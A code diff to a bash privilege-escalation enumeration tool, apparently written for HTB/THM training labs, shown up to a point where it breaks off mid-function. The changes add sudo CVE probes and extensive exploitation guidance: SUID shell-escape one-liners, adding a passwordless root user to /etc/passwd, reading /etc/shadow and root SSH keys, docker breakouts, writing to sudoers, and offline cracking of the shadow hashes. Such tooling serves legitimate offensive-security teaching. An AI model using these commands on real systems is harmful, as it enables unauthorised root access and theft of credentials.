@@ -1,6 +1,6 @@
 #!/bin/bash
 # LearnPeas -  Privilege Escalation In-Field Educational Tool
-# Comprehensive enumeration + education for HTB/THM/CTF environments
+# Comprehensive enumeration + education for HTB/THM environments
 
 set -o pipefail
 
@@ -11,7 +11,8 @@ P='\033[35m' C='\033[36m' W='\033[37m' RST='\033[0m'
 CRIT='\033[41m\033[1;97m'
 # CTF flag alert (purple background + white text)
 FLAG='\033[45m\033[1;97m'
-
+# Requires work
+WORK='\033[44m\033[1;97m'
 # === CONFIGURATION ===
 VERBOSE=0
 EXPLAIN=1
@@ -1874,7 +1875,6 @@ enum_sudo() {
         fi
     fi
 }
-# === SUDO VERSION ANALYSIS ===
 enum_sudo_version() {
     section "SUDO VERSION ANALYSIS"
     
@@ -1908,6 +1908,14 @@ enum_sudo_version() {
             if [ "$patch" -lt 16 ] || ([ "$patch" -eq 16 ] && [ -n "$p_version" ] && [ "$p_version" -lt 1 ]); then
                 critical "Sudo vulnerable to CVE-2025-32463 - Privilege escalation"
                 vuln "sudo < 1.9.16p1 vulnerable"
+                
+                # Quick verification check
+                info "Performing quick verification check..."
+                local test_result=$(sudo -V 2>&1 | grep -i "patch" || echo "")
+                if [ -n "$test_result" ]; then
+                    info "Note: System may have backported patches. Manual verification recommended."
+                fi
+                
                 log ""
                 teach "╔════════════════════════════════════════════════════════════╗"
                 teach "║  CVE-2025-32463 - Recent Sudo Vulnerability"
@@ -1939,6 +1947,16 @@ enum_sudo_version() {
             if [ "$minor" -eq 8 ] || ([ "$minor" -eq 9 ] && [ "$patch" -le 12 ]); then
                 critical "Sudo vulnerable to CVE-2023-22809 - sudoedit bypass"
                 vuln "sudo 1.8.0 - 1.9.12p1 vulnerable"
+                
+                # Quick verification check
+                info "Performing quick verification check..."
+                local sudoedit_test=$(sudoedit -s / 2>&1)
+                if echo "$sudoedit_test" | grep -qi "invalid option\|unrecognized option"; then
+                    info "✓ Quick check suggests vulnerability may be patched (backported fix detected)"
+                elif echo "$sudoedit_test" | grep -qi "usage:"; then
+                    warn "⚠ Quick check indicates system may still be vulnerable"
+                fi
+                
                 log ""
                 teach "╔════════════════════════════════════════════════════════════╗"
                 teach "║  CVE-2023-22809 - Sudoedit Arbitrary File Write"
@@ -1983,6 +2001,16 @@ enum_sudo_version() {
             if [ "$minor" -lt 9 ] || ([ "$minor" -eq 9 ] && [ "$patch" -lt 5 ]); then
                 critical "Sudo vulnerable to Baron Samedit (CVE-2021-3156) - Heap overflow"
                 vuln "sudo < 1.9.5p2 vulnerable"
+                
+                # Quick verification check - the canonical Baron Samedit test
+                info "Performing quick verification check..."
+                local baron_test=$(sudoedit -s / 2>&1)
+                if echo "$baron_test" | grep -qi "usage:"; then
+                    warn "⚠ Quick check indicates system IS VULNERABLE to Baron Samedit"
+                elif echo "$baron_test" | grep -qi "invalid option\|sudoedit:"; then
+                    info "✓ Quick check suggests vulnerability may be patched (backported fix detected)"
+                fi
+                
                 log ""
                 teach "╔════════════════════════════════════════════════════════════╗"
                 teach "║  CVE-2021-3156 - Baron Samedit (Heap Buffer Overflow)"
@@ -2037,6 +2065,16 @@ enum_sudo_version() {
         if [ "$major" -eq 1 ] && [ "$minor" -eq 8 ] && [ "$patch" -lt 28 ]; then
             critical "Sudo vulnerable to CVE-2019-14287 - User ID bypass"
             vuln "sudo < 1.8.28 vulnerable"
+            
+            # Quick verification check
+            info "Performing quick verification check..."
+            local runas_test=$(sudo -u#-1 id 2>&1)
+            if echo "$runas_test" | grep -qi "unknown user\|invalid user"; then
+                info "✓ Quick check suggests vulnerability may be patched (backported fix detected)"
+            elif echo "$runas_test" | grep -qi "uid=0\|root"; then
+                warn "⚠ Quick check indicates system IS VULNERABLE to runas bypass"
+            fi
+            
             log ""
             teach "╔════════════════════════════════════════════════════════════╗"
             teach "║  CVE-2019-14287 - Sudo Runas User ID Bypass"
@@ -2095,6 +2133,17 @@ enum_sudo_version() {
             if ([ "$minor" -eq 7 ] && [ "$patch" -ge 1 ]) || ([ "$minor" -eq 8 ] && [ "$patch" -le 30 ]); then
                 warn "Sudo potentially vulnerable to CVE-2019-18634 - Buffer overflow"
                 info "Requires pwfeedback enabled in sudoers (uncommon)"
+                
+                # Quick verification check - see if pwfeedback is actually enabled
+                info "Performing quick verification check..."
+                local pwfeedback_check=$(grep -r "pwfeedback" /etc/sudoers /etc/sudoers.d/ 2>/dev/null || sudo -l 2>&1 | grep -i "pwfeedback" || echo "")
+                if [ -z "$pwfeedback_check" ]; then
+                    info "✓ pwfeedback is NOT enabled - system is NOT vulnerable to CVE-2019-18634"
+                else
+                    warn "⚠ pwfeedback appears to be ENABLED - system may be vulnerable"
+                    info "Found: $pwfeedback_check"
+                fi
+                
                 log ""
                 teach "╔════════════════════════════════════════════════════════════╗"
                 teach "║  CVE-2019-18634 - Password Feedback Buffer Overflow"
@@ -2181,6 +2230,15 @@ enum_suid() {
         "Legitimate use: /usr/bin/passwd needs root to modify /etc/shadow. Dangerous: Custom SUID binaries may have vulnerabilities, call other programs unsafely, or have shell escape features." \
         "Attack vectors:\n  1. Binary spawns a shell directly\n  2. Binary calls other programs without absolute paths (PATH hijacking)\n  3. Binary has buffer overflow or other memory corruption\n  4. Binary has command injection vulnerability"
     
+    # PHASE 1: SILENT SCAN - Collect findings
+    local temp_unknown_suid="/tmp/.learnpeas_unknown_suid_$$"
+    local temp_exploitable_suid="/tmp/.learnpeas_exploitable_suid_$$"
+    
+    cleanup_suid_temps() {
+        rm -f "$temp_unknown_suid" "$temp_exploitable_suid" 2>/dev/null
+    }
+    trap cleanup_suid_temps RETURN
+    
     # Comprehensive whitelist of legitimate SUID binaries
     local legit_suid=(
         "/usr/bin/passwd" "/usr/bin/sudo" "/usr/bin/su" "/bin/su"
@@ -2213,122 +2271,405 @@ enum_suid() {
         done
         
         if [ $is_legit -eq 0 ]; then
-            vuln "Non-standard SUID binary: $suid_bin"
-            
             local owner=$(stat -c %U "$suid_bin" 2>/dev/null)
             local perms=$(stat -c %a "$suid_bin" 2>/dev/null)
-            log "  Owner: $owner | Permissions: $perms"
             
             local file_type=$(file "$suid_bin" 2>/dev/null)
             if echo "$file_type" | grep -q "script"; then
-                warn "  Script with SUID bit - kernel ignores this"
-                log ""
+                # Skip scripts - kernel ignores SUID on scripts
                 continue
             fi
             
-            log ""
             local basename=$(basename "$suid_bin")
+            
+            # Check if it's a known exploitable binary
+            case $basename in
+                vim|vi|nano|find|python*|python|perl|ruby|node|nodejs|bash|sh|zsh|dash|awk|gawk|nawk|less|more|env|systemctl|yum|apt|apt-get|git|tar|make|nmap|docker|cp|base64|xxd)
+                    echo "$suid_bin|$owner|$perms|$basename" >> "$temp_exploitable_suid"
+                    ;;
+                *)
+                    # Unknown/non-standard binary
+                    echo "$suid_bin|$owner|$perms" >> "$temp_unknown_suid"
+                    ;;
+            esac
+        fi
+    done
+    
+    # PHASE 2: REPORT UNKNOWN SUID BINARIES (grouped)
+    if [ -s "$temp_unknown_suid" ]; then
+        log ""
+        while IFS='|' read -r suid_bin owner perms; do
+            vuln "Non-standard SUID binary: $suid_bin"
+            log "  Owner: $owner | Permissions: $perms"
+            log ""
+        done < "$temp_unknown_suid"
+        
+        teach "╔═══════════════════════════════════════════════════════════╗"
+        teach "║  ANALYSIS GUIDE FOR NON-STANDARD SUID BINARIES"
+        teach "╚═══════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "These binaries are not commonly exploitable, but should be analyzed:"
+        teach ""
+        teach "STEP 1: Check GTFOBins"
+        teach "  Visit: https://gtfobins.github.io/"
+        teach "  Search for the binary name to see if there are known techniques"
+        teach ""
+        teach "STEP 2: Analyze binary for dangerous function calls"
+        teach "  strings <binary> | grep -E 'system|exec|popen|sh|bash'"
+        teach "  Look for signs it calls external commands"
+        teach ""
+        teach "STEP 3: Trace library calls"
+        teach "  ltrace <binary> 2>&1 | grep -E 'system|exec'"
+        teach "  See what functions it calls at runtime"
+        teach ""
+        teach "STEP 4: Check for PATH hijacking"
+        teach "  If binary calls commands without absolute paths (e.g., 'ls' instead of '/bin/ls'):"
+        teach "  • Create malicious binary in /tmp"
+        teach "  • Add /tmp to PATH before executing SUID binary"
+        teach "  • PATH=/tmp:\$PATH <suid_binary>"
+        teach ""
+        teach "STEP 5: Look for command injection"
+        teach "  Test with special characters: ; | & \$ ( ) < >"
+        teach "  Some binaries pass user input to system() unsafely"
+        teach ""
+        teach "STEP 6: Check version for known CVEs"
+        teach "  <binary> --version"
+        teach "  searchsploit <binary> <version>"
+        log ""
+    fi
+    
+    # PHASE 3: REPORT KNOWN EXPLOITABLE SUID BINARIES (individual instructions)
+    if [ -s "$temp_exploitable_suid" ]; then
+        while IFS='|' read -r suid_bin owner perms basename; do
+            log ""
             
             case $basename in
                 vim|vi)
                     critical "SUID vim/vi - Shell escape available"
+                    vuln "$suid_bin"
+                    log "  Owner: $owner | Permissions: $perms"
+                    log ""
+                    teach "╔═══════════════════════════════════════════════════════════╗"
+                    teach "║  VIM/VI EXPLOITATION"
+                    teach "╚═══════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "METHOD 1: Direct command execution"
                     teach "  $suid_bin -c ':!/bin/bash -p'"
-                    teach "  Or: $suid_bin then :set shell=/bin/bash then :shell"
+                    teach ""
+                    teach "METHOD 2: Shell escape from editor"
+                    teach "  $suid_bin"
+                    teach "  :set shell=/bin/bash"
+                    teach "  :shell"
+                    log ""
                     ;;
                     
                 nano)
                     critical "SUID nano - Command execution via Control-R Control-X"
-                    teach "  $suid_bin then Ctrl+R Ctrl+X then type: reset; bash -p"
+                    vuln "$suid_bin"
+                    log "  Owner: $owner | Permissions: $perms"
+                    log ""
+                    teach "╔═══════════════════════════════════════════════════════════╗"
+                    teach "║  NANO EXPLOITATION"
+                    teach "╚═══════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "  $suid_bin"
+                    teach "  Press: Ctrl+R Ctrl+X"
+                    teach "  Type: reset; bash -p"
+                    teach "  Press: Enter"
+                    log ""
                     ;;
                     
                 find)
                     critical "SUID find - Execute commands via -exec"
+                    vuln "$suid_bin"
+                    log "  Owner: $owner | Permissions: $perms"
+                    log ""
+                    teach "╔═══════════════════════════════════════════════════════════╗"
+                    teach "║  FIND EXPLOITATION"
+                    teach "╚═══════════════════════════════════════════════════════════╝"
+                    teach ""
                     teach "  $suid_bin . -exec /bin/bash -p \\; -quit"
+                    log ""
                     ;;
                     
                 python*|python)
                     critical "SUID python - Direct shell spawn"
+                    vuln "$suid_bin"
+                    log "  Owner: $owner | Permissions: $perms"
+                    log ""
+                    teach "╔═══════════════════════════════════════════════════════════╗"
+                    teach "║  PYTHON EXPLOITATION"
+                    teach "╚═══════════════════════════════════════════════════════════╝"
+                    teach ""
                     teach "  $suid_bin -c 'import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'"
+                    log ""
                     ;;
                     
                 perl)
                     critical "SUID perl - Execute shell"
+                    vuln "$suid_bin"
+                    log "  Owner: $owner | Permissions: $perms"
+                    log ""
+                    teach "╔═══════════════════════════════════════════════════════════╗"
+                    teach "║  PERL EXPLOITATION"
+                    teach "╚═══════════════════════════════════════════════════════════╝"
+                    teach ""
                     teach "  $suid_bin -e 'exec \"/bin/bash\", \"-p\";'"
+                    log ""
                     ;;
                     
                 ruby)
                     critical "SUID ruby - Spawn privileged shell"
+                    vuln "$suid_bin"
+                    log "  Owner: $owner | Permissions: $perms"
+                    log ""
+                    teach "╔═══════════════════════════════════════════════════════════╗"
+                    teach "║  RUBY EXPLOITATION"
+                    teach "╚═══════════════════════════════════════════════════════════╝"
+                    teach ""
                     teach "  $suid_bin -e 'exec \"/bin/bash\", \"-p\"'"
+                    log ""
                     ;;
                     
                 node|nodejs)
                     critical "SUID node - Child process spawn"
+                    vuln "$suid_bin"
+                    log "  Owner: $owner | Permissions: $perms"
+                    log ""
+                    teach "╔═══════════════════════════════════════════════════════════╗"
+                    teach "║  NODE/NODEJS EXPLOITATION"
+                    teach "╚═══════════════════════════════════════════════════════════╝"
+                    teach ""
                     teach "  $suid_bin -e 'require(\"child_process\").spawn(\"/bin/bash\", [\"-p\"], {stdio: [0,1,2]})'"
+                    log ""
                     ;;
                     
                 bash|sh|zsh|dash)
                     critical "SUID shell - Direct root access"
+                    vuln "$suid_bin"
+                    log "  Owner: $owner | Permissions: $perms"
+                    log ""
+                    teach "╔═══════════════════════════════════════════════════════════╗"
+                    teach "║  SHELL EXPLOITATION"
+                    teach "╚═══════════════════════════════════════════════════════════╝"
+                    teach ""
                     teach "  $suid_bin -p"
+                    log ""
                     ;;
                     
                 awk|gawk|nawk)
                     critical "SUID awk - System call execution"
+                    vuln "$suid_bin"
+                    log "  Owner: $owner | Permissions: $perms"
+                    log ""
+                    teach "╔═══════════════════════════════════════════════════════════╗"
+                    teach "║  AWK EXPLOITATION"
+                    teach "╚═══════════════════════════════════════════════════════════╝"
+                    teach ""
                     teach "  $suid_bin 'BEGIN {system(\"/bin/bash -p\")}'"
+                    log ""
                     ;;
                     
                 less|more)
                     critical "SUID less/more - Shell escape via bang"
-                    teach "  $suid_bin /etc/profile then type: !/bin/bash -p"
+                    vuln "$suid_bin"
+                    log "  Owner: $owner | Permissions: $perms"
+                    log ""
+                    teach "╔═══════════════════════════════════════════════════════════╗"
+                    teach "║  LESS/MORE EXPLOITATION"
+                    teach "╚═══════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "  $suid_bin /etc/profile"
+                    teach "  Then type: !/bin/bash -p"
+                    log ""
                     ;;
                     
                 env)
                     critical "SUID env - Execute arbitrary binary"
+                    vuln "$suid_bin"
+                    log "  Owner: $owner | Permissions: $perms"
+                    log ""
+                    teach "╔═══════════════════════════════════════════════════════════╗"
+                    teach "║  ENV EXPLOITATION"
+                    teach "╚═══════════════════════════════════════════════════════════╝"
+                    teach ""
                     teach "  $suid_bin /bin/bash -p"
+                    log ""
                     ;;
                     
                 systemctl)
                     critical "SUID systemctl - Shell escape via pager"
+                    vuln "$suid_bin"
+                    log "  Owner: $owner | Permissions: $perms"
+                    log ""
+                    teach "╔═══════════════════════════════════════════════════════════╗"
+                    teach "║  SYSTEMCTL EXPLOITATION"
+                    teach "╚═══════════════════════════════════════════════════════════╝"
+                    teach ""
                     teach "  $suid_bin status trail.service"
-                    teach "  Wait for pager then type: !bash -p"
+                    teach "  Wait for pager to appear, then type: !bash -p"
+                    log ""
                     ;;
                     
                 yum)
                     critical "SUID yum - Plugin exploitation for root shell"
+                    vuln "$suid_bin"
+                    log "  Owner: $owner | Permissions: $perms"
+                    log ""
+                    teach "╔═══════════════════════════════════════════════════════════╗"
+                    teach "║  YUM EXPLOITATION"
+                    teach "╚═══════════════════════════════════════════════════════════╝"
+                    teach ""
                     teach "  TF=\$(mktemp -d)"
                     teach "  echo 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' > \$TF/x.py"
                     teach "  $suid_bin -c \"exec=python \$TF/x.py\" --plugins=\$TF"
+                    log ""
                     ;;
                     
                 apt|apt-get)
                     critical "SUID apt - Execute commands via APT Pre-Invoke"
+                    vuln "$suid_bin"
+                    log "  Owner: $owner | Permissions: $perms"
+                    log ""
+                    teach "╔═══════════════════════════════════════════════════════════╗"
+                    teach "║  APT/APT-GET EXPLOITATION"
+                    teach "╚═══════════════════════════════════════════════════════════╝"
+                    teach ""
                     teach "  $suid_bin update -o APT::Update::Pre-Invoke::=/bin/sh"
+                    log ""
                     ;;
                     
                 git)
-                    teach "  $suid_bin help status then in pager: !sh"
+                    critical "SUID git - Pager escape"
+                    vuln "$suid_bin"
+                    log "  Owner: $owner | Permissions: $perms"
+                    log ""
+                    teach "╔═══════════════════════════════════════════════════════════╗"
+                    teach "║  GIT EXPLOITATION"
+                    teach "╚═══════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "  $suid_bin help status"
+                    teach "  Then in pager type: !sh"
+                    log ""
                     ;;
                     
                 tar)
                     critical "SUID tar - Checkpoint action execution"
+                    vuln "$suid_bin"
+                    log "  Owner: $owner | Permissions: $perms"
+                    log ""
+                    teach "╔═══════════════════════════════════════════════════════════╗"
+                    teach "║  TAR EXPLOITATION"
+                    teach "╚═══════════════════════════════════════════════════════════╝"
+                    teach ""
                     teach "  $suid_bin -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
+                    log ""
                     ;;
                     
                 make)
                     critical "SUID make - Execute Makefile commands"
+                    vuln "$suid_bin"
+                    log "  Owner: $owner | Permissions: $perms"
+                    log ""
+                    teach "╔═══════════════════════════════════════════════════════════╗"
+                    teach "║  MAKE EXPLOITATION"
+                    teach "╚═══════════════════════════════════════════════════════════╝"
+                    teach ""
                     teach "  $suid_bin -s --eval=\$'x:\\n\\t-/bin/bash -p'"
+                    log ""
                     ;;
                     
-                *)
-                    teach "  Analysis steps:"
-                    teach "    1. Check GTFOBins: https://gtfobins.github.io/"
-                    teach "    2. strings $suid_bin | grep -E 'system|exec|popen'"
-                    teach "    3. ltrace $suid_bin 2>&1 | grep -E 'system|exec'"
-                    teach "    4. Check for PATH hijacking if it calls commands without full paths"
+                nmap)
+                    critical "SUID nmap - Interactive mode shell escape"
+                    vuln "$suid_bin"
+                    log "  Owner: $owner | Permissions: $perms"
+                    log ""
+                    teach "╔═══════════════════════════════════════════════════════════╗"
+                    teach "║  NMAP EXPLOITATION"
+                    teach "╚═══════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "Older nmap versions (< 5.21) have interactive mode:"
+                    teach "  $suid_bin --interactive"
+                    teach "  nmap> !sh"
+                    teach ""
+                    teach "Newer versions can use script execution:"
+                    teach "  echo 'os.execute(\"/bin/bash -p\")' > /tmp/shell.nse"
+                    teach "  $suid_bin --script=/tmp/shell.nse"
+                    log ""
+                    ;;
+                    
+                docker)
+                    critical "SUID docker - Container escape to root"
+                    vuln "$suid_bin"
+                    log "  Owner: $owner | Permissions: $perms"
+                    log ""
+                    teach "╔═══════════════════════════════════════════════════════════╗"
+                    teach "║  DOCKER EXPLOITATION"
+                    teach "╚═══════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "Mount host filesystem and chroot into it:"
+                    teach "  $suid_bin run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash"
+                    teach ""
+                    teach "Or get privileged shell directly:"
+                    teach "  $suid_bin run --rm -it --privileged alpine /bin/sh"
+                    log ""
+                    ;;
+                    
+                cp)
+                    critical "SUID cp - Overwrite critical files"
+                    vuln "$suid_bin"
+                    log "  Owner: $owner | Permissions: $perms"
+                    log ""
+                    teach "╔═══════════════════════════════════════════════════════════╗"
+                    teach "║  CP EXPLOITATION"
+                    teach "╚═══════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "METHOD 1: Overwrite /etc/passwd"
+                    teach "  echo 'root2::0:0:root:/root:/bin/bash' > /tmp/passwd"
+                    teach "  $suid_bin /tmp/passwd /etc/passwd"
+                    teach "  su root2  # No password required"
+                    teach ""
+                    teach "METHOD 2: Overwrite SUID binary"
+                    teach "  $suid_bin /bin/bash /usr/bin/some_suid_binary"
+                    log ""
+                    ;;
+                    
+                base64)
+                    critical "SUID base64 - Read arbitrary files"
+                    vuln "$suid_bin"
+                    log "  Owner: $owner | Permissions: $perms"
+                    log ""
+                    teach "╔═══════════════════════════════════════════════════════════╗"
+                    teach "║  BASE64 EXPLOITATION"
+                    teach "╚═══════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "Read sensitive files as root:"
+                    teach "  $suid_bin /etc/shadow | base64 -d"
+                    teach "  $suid_bin /root/.ssh/id_rsa | base64 -d"
+                    teach ""
+                    teach "Can't directly get shell, but can read root's SSH keys, shadow file, etc."
+                    log ""
+                    ;;
+                    
+                xxd)
+                    critical "SUID xxd - Read/Write arbitrary files"
+                    vuln "$suid_bin"
+                    log "  Owner: $owner | Permissions: $perms"
+                    log ""
+                    teach "╔═══════════════════════════════════════════════════════════╗"
+                    teach "║  XXD EXPLOITATION"
+                    teach "╚═══════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "Read sensitive files:"
+                    teach "  $suid_bin /etc/shadow | xxd -r"
+                    teach ""
+                    teach "Write to protected files (add root user with no password):"
+                    teach "  echo 'root2::0:0:root:/root:/bin/bash' | xxd | $suid_bin -r - /etc/passwd"
+                    log ""
                     ;;
             esac
-            log ""
-        fi
-    done
+        done < "$temp_exploitable_suid"
+    fi
 }
 # === SGID BINARIES ===
 enum_sgid() {
@@ -2339,17 +2680,250 @@ enum_sgid() {
         "Less common than SUID for privilege escalation, but if SGID binary is in 'shadow' or 'docker' group, it can be exploited." \
         "Look for SGID binaries in privileged groups, then analyze like SUID binaries."
     
-        find / \( -path "*/containers/storage/*" -o -path /proc -o -path /sys -o -path /dev \) -prune -o -perm -2000 -type f -print 2>/dev/null | head -20 | while read sgid_bin; do
+    # PHASE 1: SILENT SCAN - Collect findings by group
+    local temp_sgid_shadow="/tmp/.learnpeas_sgid_shadow_$$"
+    local temp_sgid_docker="/tmp/.learnpeas_sgid_docker_$$"
+    local temp_sgid_disk="/tmp/.learnpeas_sgid_disk_$$"
+    local temp_sgid_sudo="/tmp/.learnpeas_sgid_sudo_$$"
+    
+    cleanup_sgid_temps() {
+        rm -f "$temp_sgid_shadow" "$temp_sgid_docker" "$temp_sgid_disk" "$temp_sgid_sudo" 2>/dev/null
+    }
+    trap cleanup_sgid_temps RETURN
+    
+    find / \( -path "*/containers/storage/*" -o -path /proc -o -path /sys -o -path /dev \) -prune -o -perm -2000 -type f -print 2>/dev/null | while read sgid_bin; do
         local group=$(stat -c %G "$sgid_bin" 2>/dev/null)
+        local perms=$(stat -c %a "$sgid_bin" 2>/dev/null)
+        
         case $group in
-            shadow|docker|disk|sudo)
-                vuln "SGID binary in privileged group '$group': $sgid_bin"
-                teach "  This binary runs with $group privileges"
+            shadow)
+                echo "$sgid_bin|$perms" >> "$temp_sgid_shadow"
+                ;;
+            docker)
+                echo "$sgid_bin|$perms" >> "$temp_sgid_docker"
+                ;;
+            disk)
+                echo "$sgid_bin|$perms" >> "$temp_sgid_disk"
+                ;;
+            sudo)
+                echo "$sgid_bin|$perms" >> "$temp_sgid_sudo"
                 ;;
         esac
     done
+    
+    # PHASE 2: REPORT FINDINGS BY GROUP
+    
+    # Shadow group
+    if [ -s "$temp_sgid_shadow" ]; then
+        log ""
+        critical "${WORK}[REQUIRES CRACKING]${RST} SGID BINARIES IN 'shadow' GROUP - Password hash access"
+        log ""
+        while IFS='|' read -r sgid_bin perms; do
+            vuln "  $sgid_bin (Permissions: $perms)"
+        done < "$temp_sgid_shadow"
+        
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════╗"
+        teach "║  SHADOW GROUP EXPLOITATION"
+        teach "╚═══════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "WHAT SHADOW GROUP GIVES YOU:"
+        teach "  The 'shadow' group has read access to /etc/shadow, which contains"
+        teach "  password hashes for all users on the system."
+        teach ""
+        teach "WHY THIS MATTERS:"
+        teach "  • /etc/shadow is normally only readable by root (permissions: 640)"
+        teach "  • It contains hashed passwords in formats like:"
+        teach "    - \$6\$ = SHA-512 (modern, strong)"
+        teach "    - \$5\$ = SHA-256"
+        teach "    - \$1\$ = MD5 (old, weak)"
+        teach "  • If you can read it, you can crack weak passwords offline"
+        teach ""
+        teach "EXPLOITATION STEPS:"
+        teach ""
+        teach "STEP 1: Use SGID binary to read /etc/shadow"
+        local first_binary=$(head -1 "$temp_sgid_shadow" | cut -d'|' -f1)
+        if [ -n "$first_binary" ]; then
+            teach "  Check if binary can read files (strings, cat-like behavior):"
+            teach "  $first_binary /etc/shadow"
+        fi
+        teach ""
+        teach "  If that doesn't work, look for ways to abuse the binary:"
+        teach "  • Check GTFOBins for the binary name"
+        teach "  • Look for file read capabilities"
+        teach "  • Try PATH hijacking if it calls other commands"
+        teach ""
+        teach "STEP 2: Extract password hashes"
+        teach "  grep -v '!' /etc/shadow | grep -v '*'"
+        teach "  Look for lines like: username:\$6\$salt\$hash:18000:0:99999:7:::"
+        teach ""
+        teach "STEP 3: Crack the hashes offline"
+        teach "  Save hashes to a file:"
+        teach "  grep '^[^:]*:\$' /etc/shadow > hashes.txt"
+        teach ""
+        teach "  Use John the Ripper:"
+        teach "  john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt"
+        teach ""
+        teach "  Or use Hashcat (faster with GPU):"
+        teach "  hashcat -m 1800 -a 0 hashes.txt rockyou.txt"
+        teach "  (mode 1800 = SHA-512 Unix)"
+        teach ""
+        teach "UNDERSTANDING /etc/shadow FORMAT:"
+        teach "  username:\$algorithm\$salt\$hash:lastchange:min:max:warn:inactive:expire:"
+        teach ""
+        teach "  • \$6\$ = SHA-512 (secure, slow to crack)"
+        teach "  • \$5\$ = SHA-256 (secure, slow to crack)"
+        teach "  • \$1\$ = MD5 (WEAK, fast to crack)"
+        teach "  • ! or * = account locked/disabled"
+        teach "  • Empty hash field = no password (rare but critical)"
+        teach ""
+        teach "TARGET PRIORITY:"
+        teach "  1. Look for users with MD5 hashes (\$1\$) - easiest to crack"
+        teach "  2. Look for service accounts with passwords"
+        teach "  3. Focus on admin/sudo group members"
+        teach "  4. Users with recent lastchange dates (active accounts)"
+        log ""
+    fi
+    
+    # Docker group
+    if [ -s "$temp_sgid_docker" ]; then
+        log ""
+        critical "SGID BINARIES IN 'docker' GROUP - Container escape to root"
+        log ""
+        while IFS='|' read -r sgid_bin perms; do
+            vuln "  $sgid_bin (Permissions: $perms)"
+        done < "$temp_sgid_docker"
+        
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════╗"
+        teach "║  DOCKER GROUP EXPLOITATION"
+        teach "╚═══════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "WHAT DOCKER GROUP GIVES YOU:"
+        teach "  The 'docker' group can interact with Docker daemon socket."
+        teach "  Docker daemon runs as root, so any docker command = root access."
+        teach ""
+        teach "WHY THIS IS CRITICAL:"
+        teach "  Docker containers can mount the host filesystem and break out."
+        teach "  Being in docker group is essentially equivalent to root access."
+        teach ""
+        teach "EXPLOITATION - METHOD 1: Mount host filesystem"
+        teach "  docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash"
+        teach ""
+        teach "  Explanation:"
+        teach "  • -v /:/mnt = Mount host root directory to /mnt in container"
+        teach "  • chroot /mnt = Change root to mounted host filesystem"
+        teach "  • Result: You're root on the HOST, not just in container"
+        teach ""
+        teach "EXPLOITATION - METHOD 2: Privileged container"
+        teach "  docker run --rm -it --privileged --net=host --pid=host --ipc=host \\"
+        teach "    --volume /:/host alpine chroot /host /bin/bash"
+        teach ""
+        teach "EXPLOITATION - METHOD 3: Add yourself to sudoers"
+        teach "  docker run -v /etc:/mnt --rm -it alpine sh -c \\"
+        teach "    'echo \"youruser ALL=(ALL) NOPASSWD: ALL\" >> /mnt/sudoers'"
+        teach ""
+        teach "EXPLOITATION - METHOD 4: Create SUID shell"
+        teach "  docker run -v /:/mnt --rm -it alpine sh -c \\"
+        teach "    'cp /bin/sh /mnt/tmp/rootshell && chmod 4755 /mnt/tmp/rootshell'"
+        teach "  /tmp/rootshell -p"
+        teach ""
+        teach "IMPORTANT NOTES:"
+        teach "  • Check if you have access: docker ps"
+        teach "  • Check available images: docker images"
+        teach "  • If no images, pull one: docker pull alpine"
+        teach "  • This works even without SGID - just being in docker group is enough"
+        log ""
+    fi
+    
+    # Disk group
+    if [ -s "$temp_sgid_disk" ]; then
+        log ""
+        critical "SGID BINARIES IN 'disk' GROUP - Raw disk access"
+        log ""
+        while IFS='|' read -r sgid_bin perms; do
+            vuln "  $sgid_bin (Permissions: $perms)"
+        done < "$temp_sgid_disk"
+        
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════╗"
+        teach "║  DISK GROUP EXPLOITATION"
+        teach "╚═══════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "WHAT DISK GROUP GIVES YOU:"
+        teach "  The 'disk' group has read/write access to raw disk devices."
+        teach "  This includes: /dev/sda, /dev/sda1, /dev/nvme0n1, etc."
+        teach ""
+        teach "WHY THIS IS CRITICAL:"
+        teach "  Raw disk access bypasses ALL file permissions."
+        teach "  You can read/write any file on the filesystem, including:"
+        teach "  • /etc/shadow (password hashes)"
+        teach "  • /root/.ssh/authorized_keys"
+        teach "  • Any root-owned file"
+        teach ""
+        teach "EXPLOITATION - METHOD 1: Read /etc/shadow via debugfs"
+        teach "  debugfs /dev/sda1"
+        teach "  debugfs: cat /etc/shadow"
+        teach ""
+        teach "EXPLOITATION - METHOD 2: Mount filesystem elsewhere"
+        teach "  mkdir /tmp/mnt"
+        teach "  mount /dev/sda1 /tmp/mnt"
+        teach "  cat /tmp/mnt/etc/shadow"
+        teach ""
+        teach "EXPLOITATION - METHOD 3: Direct disk read with dd"
+        teach "  # Find inode of /etc/shadow"
+        teach "  debugfs -R 'stat /etc/shadow' /dev/sda1"
+        teach "  # Read the file directly from disk"
+        teach "  dd if=/dev/sda1 bs=4096 skip=<block_number> count=1"
+        teach ""
+        teach "EXPLOITATION - METHOD 4: Write root SSH key"
+        teach "  debugfs -w /dev/sda1"
+        teach "  debugfs: cd /root/.ssh"
+        teach "  debugfs: write /tmp/my_key.pub authorized_keys"
+        teach ""
+        teach "COMMON DISK DEVICES:"
+        teach "  • /dev/sda, /dev/sda1 = First SATA/SCSI disk"
+        teach "  • /dev/nvme0n1 = NVMe SSD"
+        teach "  • /dev/vda = Virtual disk (VMs)"
+        teach ""
+        teach "Check available disks: ls -la /dev/sd* /dev/nvme* /dev/vd*"
+        log ""
+    fi
+    
+    # Sudo group
+    if [ -s "$temp_sgid_sudo" ]; then
+        log ""
+        warn "SGID BINARIES IN 'sudo' GROUP"
+        log ""
